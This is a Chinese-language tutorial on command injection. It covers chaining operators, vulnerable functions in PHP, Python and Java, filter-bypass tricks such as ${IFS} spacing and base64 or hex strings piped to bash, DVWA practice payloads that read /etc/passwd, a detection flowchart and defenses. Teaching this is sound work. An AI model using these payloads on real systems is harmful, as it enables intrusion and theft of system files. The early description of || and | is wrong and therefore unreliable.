# 命令执行

## 0x01 命令执行漏洞原理

### 漏洞的本质
> 把数据和指令混淆了

### 如何知道要检查
> 观察应用服务器实现功能是否是系统层面常见功能

## 0x02 单行执行多条命令
`command1 && command2`: 前面命令成功执行之后,后一条指令执行.  
`command1 & command2`: 不行的话,多执行几次,可以执行第二条指令  
`command1; command2`: 先执行前一条指令(不管成不成功),后执行第二条指令  
`command1 || command2`: 先执行前一条指令(不管成不成功),后执行第二条指令  
`command1 | command2`: 先执行前一条指令(不管成不成功),后执行第二条指令  

## 0x03 常见漏洞函数列表

### PHP
| 函数 | 说明 |
|------|------|
| `system()` | 执行外部程序并输出结果 |
| `exec()` | 执行外部程序，可返回最后一行输出 |
| `shell_exec()` | 通过 shell 执行命令，返回完整输出 |
| `passthru()` | 执行外部程序并直接输出原始结果 |
| `popen()` | 打开进程文件指针 |
| `proc_open()` | 执行命令并打开文件指针 |
| `` `command` `` | 反引号执行（等同于 shell_exec） |

### Python
| 函数/模块 | 说明 |
|-----------|------|
| `os.system()` | 在子 shell 中执行命令 |
| `os.popen()` | 打开命令的管道 |
| `subprocess.call()` | 执行命令 |
| `subprocess.run()` | 执行命令（Python 3.5+） |
| `subprocess.Popen()` | 创建子进程 |
| `eval()` + `__import__('os').system()` | 间接命令执行 |

### Java
| 类/方法 | 说明 |
|---------|------|
| `Runtime.getRuntime().exec()` | 执行系统命令 |
| `ProcessBuilder` | 创建系统进程 |
| `Groovy` 的 `execute()` | 执行 shell 命令 |

## 0x04 绕过技巧

### 空格绕过
| 绕过方式 | 示例 |
|----------|------|
| `${IFS}` | `cat${IFS}/etc/passwd` |
| `$IFS$9` | `cat$IFS$9/etc/passwd` |
| `%09` (Tab) | `cat%09/etc/passwd` |
| `<>` 重定向 | `cat<>/etc/passwd` |
| `{cat,/etc/passwd}` | 大括号展开 |

### 编码绕过
| 编码类型 | 示例 |
|----------|------|
| Base64 | `echo d2hvYW1p\|base64 -d\|bash` |
| Hex | `echo 636174202f6574632f706173737764\|xxd -r -p\|bash` |
| Unicode | `\u0063\u0061\u0074` (cat) |

### 管道符与连接符变体
| 符号 | 说明 |
|------|------|
| `\|\|` | 前失败则执行后 |
| `\|` | 管道，前输出作为后输入 |
| `&&` | 前成功则执行后 |
| `&` | 后台执行 |
| `;` | 顺序执行 |
| `` ` `` | 命令替换 |
| `$()` | 命令替换 |
| `%0a` / `%0d` | 换行符注入 |

## 0x05 实际示例：DVWA 命令注入

DVWA (Damn Vulnerable Web Application) 的 Command Injection 模块是典型练习靶场。

**漏洞场景**：输入框用于 ping 主机，如 `127.0.0.1`，后端可能执行 `ping -c 4 <用户输入>`。

**注入示例**：
```
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1%0aid
127.0.0.1$(whoami)
```

**检测思路**：先确认命令是否执行（如 `sleep 5` 观察响应延迟），再尝试 `id`、`whoami`、`uname -a` 等获取系统信息。

## 0x06 命令注入检测流程图

```mermaid
flowchart TD
    A[发现疑似命令执行点] --> B{功能是否涉及系统调用?}
    B -->|是| C[尝试基础注入: ; \|\| \| &]
    B -->|否| Z[可能无漏洞]
    C --> D{是否有过滤?}
    D -->|无| E[直接执行 id/whoami]
    D -->|有| F[尝试绕过: 空格/编码/管道变体]
    F --> G[尝试 Base64/Hex 编码]
    F --> H[尝试 ${IFS} 等空格替代]
    F --> I[尝试 %0a 换行注入]
    E --> J[确认漏洞存在]
    G --> K{是否成功?}
    H --> K
    I --> K
    K -->|是| J
    K -->|否| L[尝试其他绕过或放弃]
    J --> M[评估危害并记录]
```

## 0x07 防御建议

1. **避免直接执行用户输入**：尽量使用白名单或预定义选项，而非将用户输入拼接进命令。
2. **白名单校验**：对输入做严格格式校验（如仅允许 IP 格式、主机名格式）。
3. **最小权限**：运行 Web 服务的进程使用低权限账户，限制可执行命令范围。
4. **禁用危险函数**：在 `php.ini` 中禁用 `system`、`exec`、`shell_exec`、`passthru` 等（若业务不需要）。
5. **参数化/API 替代**：用库函数或 API 替代系统命令（如用 PHP 的 `gethostbyname()` 替代 `ping`）。
6. **WAF 规则**：部署 WAF 检测常见命令注入特征（管道符、敏感命令等），作为纵深防御。

## 0x08 编码安全处理
1. 可以消毒,消灭敏感字符(事实上这样的黑名单也不太安全)  
2. 服务器端对用户提交的数据判断是否合法(白名单策略,数据类型判断,格式判断等等)
